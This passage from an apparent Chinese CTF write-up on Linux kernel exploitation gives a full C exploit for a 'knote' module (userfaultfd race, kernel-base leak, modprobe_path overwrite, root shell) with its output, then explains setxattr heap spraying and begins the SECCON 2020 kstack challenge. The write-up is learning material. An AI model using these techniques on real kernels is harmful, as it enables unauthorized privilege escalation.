class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> modprobe_path_offset 0x145c5c0</span></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> size;</span><br><span class="line">        <span class="keyword">size_t</span> idx;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line">    Chunk chunk=&#123;</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x1337</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    Chunk chunk =&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .data=data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x2333</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    Chunk chunk=&#123;</span><br><span class="line">        .idx=idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    Chunk chunk =&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .data=data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x8888</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> knote_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tty_fd=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_tty_struct_data</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    del(knote_fd,<span class="number">0</span>);</span><br><span class="line">    tty_fd=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!tty_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;/dev/ptmx open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] ptmx ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> modprobe_path_addr=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_modprobe_path</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] object_next changeing&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    del(knote_fd,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] debug: %p\n&quot;</span>,debug);</span><br><span class="line">    <span class="keyword">char</span> get_flag[]=<span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/getshell&quot;</span>,O_RDWR|O_CREAT);</span><br><span class="line">    write(fd,get_flag,<span class="keyword">sizeof</span>(get_flag));</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    <span class="keyword">char</span> *ptr1=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *ptr2=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">0</span>,page_size);</span><br><span class="line"></span><br><span class="line">    registerUserFaultFd(ptr1,page_size,fault_handler_thread);</span><br><span class="line">    registerUserFaultFd(ptr2,page_size,fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    knote_fd=open(<span class="string">&quot;/dev/knote&quot;</span>,O_RDWR);</span><br><span class="line">    add(knote_fd,tty_struct_size);</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,get_tty_struct_data,<span class="number">0</span>);</span><br><span class="line">    get(knote_fd,<span class="number">0</span>,ptr1);</span><br><span class="line">    <span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(*((<span class="keyword">size_t</span>*)(ptr1) + <span class="number">86</span>))&#123;</span><br><span class="line">        kernel_base=*((<span class="keyword">size_t</span>*)(ptr1) + <span class="number">86</span>)<span class="number">-0x5d4ef0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] kernel_base:%p\n&quot;</span>,kernel_base);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        errExit(<span class="string">&quot;[\033[34m\033[1m*\033[0m] get kernel_base fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr=kernel_base+modprobe_path_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] modprobe_path_addr:%p\n&quot;</span>,modprobe_path_addr);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page,&amp;modprobe_path_addr, <span class="number">8</span>);</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_modprobe_path,<span class="number">0</span>);</span><br><span class="line">    edit(knote_fd,<span class="number">0</span>,ptr2);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    edit(knote_fd,<span class="number">1</span>,<span class="string">&quot;/getshell&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> flag_fd=open(<span class="string">&quot;/flag&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!flag_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;[\033[34m\033[1m*\033[0m] hack fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(flag_fd,flag,<span class="number">0x20</span>);</span><br><span class="line">    write(<span class="number">1</span>,flag,<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假如恶意脚本是<code>cat /flag</code>在终端是没有显示的，可能最后执行<code>call_usermodehelper_exec()</code>的时候对应的终端已经不是当前终端了，所以得执行<code>chmod 777 flag</code>然后再读才能得到flag.</p>
<p><strong>结果</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/fake: line 1: ����: not found</span><br><span class="line">[*] flag&#123;12345&#125;</span><br><span class="line">ok</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">/ $ ls -l flag</span></span><br><span class="line"><span class="string">-rwxrwxrwx    1 0        0               16 Jul 26 08:41 flag</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<p>通过这一道题大概了了解了userfaultfd和modprobe_path的思路和基本用法，收获满满。</p>
<h2 id="setxattr-userfaultfd堆占位"><a href="#setxattr-userfaultfd堆占位" class="headerlink" title="setxattr+userfaultfd堆占位"></a>setxattr+userfaultfd堆占位</h2><p>和sendmsg一样都是堆喷，不同的是这个堆内核堆的大小没有限制，而sendmsg申请的内核堆的最小字节是44，所以比起sendmsg来说这个更具有一般性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在<code>setattr()</code>函数中value和size我们都可以控制，并且可以分配任意大小的object并写入，但该object在setattr执行结束会被释放，被释放后我们就无法控制这个堆了，不过好在<code>setattr</code>函数是在kmalloc完之后才执行<code>copy_from_user</code>函数，而<code>user_from_user</code>函数可以阻塞的，我们可以先mmap一个两页大小的内存，然后向第一个页的末尾填充数据，第二页再用userfaultfd缺页处理，然后把第一页的末尾传入<code>setattr()</code>函数，这样copy完第一页的末尾后再copy第二页的时候就会陷入缺页中断了，然后就达到了chunk既可控又不会被释放的目的了。</p>
<p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" alt="盗的图"></p>
<h3 id="例题-SECCON-2020-kstack"><a href="#例题-SECCON-2020-kstack" class="headerlink" title="例题 SECCON 2020 kstack"></a>例题 SECCON 2020 kstack</h3><p>qemu启动脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -net user -net nic -device e1000 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>

<p>开了kaslr和smep，也开了KPTI</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure>

<p>文件系统启动脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt;/dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">insmod /root/kstack.ko</span><br><span class="line">chmod 777 /proc/stack</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">cat /root/banner</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>

<p>还是不太能找到条件竞争的洞，就比如这道题，感觉这种条件竞争分析的时候就得在可以阻塞的位置停下来，思考如果这时候阻塞，其他线程进来会发生什么事情，然后还有思考阻塞前程序做了什么，阻塞后程序做了什么，这么会比较好分析出条件竞争如何利用，通过这道题还学到了两手，一手是在阻塞的空窗期我们想要执行某些任务，可以直接放在userfaultfd的处理函数中，这样可以完美利用空窗期，如果需要并发的话，完全可以在处理函数中创建线程然后使用wait函数等待所有线程全部结束运行然后再去处理缺页，二手是原来内核也可以doublefree,这道题的利用就是先doublefree一个0x20的堆，然后打开一个stat申请一个0x20的seq_operation，此时下次申请一个0x20的堆还是会申请到seq_opsration，也就能改seq_operation的start指针了，最后使用一个<code>add rsp,xxx</code>的gadget迁移到<strong>pt_regs</strong>上进行rop.</p>
<h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span 